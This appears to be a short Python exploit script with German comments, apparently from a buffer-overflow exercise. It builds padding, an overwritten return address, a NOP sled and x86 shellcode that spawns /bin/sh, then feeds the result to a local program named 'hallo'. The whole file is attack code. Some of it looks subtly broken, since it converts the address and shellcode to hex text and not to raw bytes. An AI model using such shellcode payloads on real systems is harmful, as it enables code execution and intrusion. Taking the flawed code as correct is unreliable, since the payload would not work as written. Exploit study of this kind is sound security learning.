#!/usr/bin/python
import struct
import os
padding = "\x41" * 76
adresse = struct.pack("I", 0x900ea0ff).hex()	#Adresse auf die der Instruction Pointer zeigen soll wird in ein int Format umgewandelt,
#kann also in 0x... Schreibweise bleiben
nops = "\x90" * 1000
#nops = "\x90"

#shellcode = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"

#shellcode = "\xCC"*4

#shellcode = b'\xcc\xcc\xcc\xcc'.hex()

shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'.hex()

#shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

#b'\xde\xad\xbe\xef'.hex()


payload = padding + adresse + nops + shellcode
print(payload)


os.system("echo " + payload+ "> payload.txt")	#schreibt den Payload automatisch in eine .txt Datei
os.system("./hallo < payload.txt")	#oeffnet das Programm mit dem Input der .txt Datei
#os.system("(cat payload.txt; cat) | hallo")
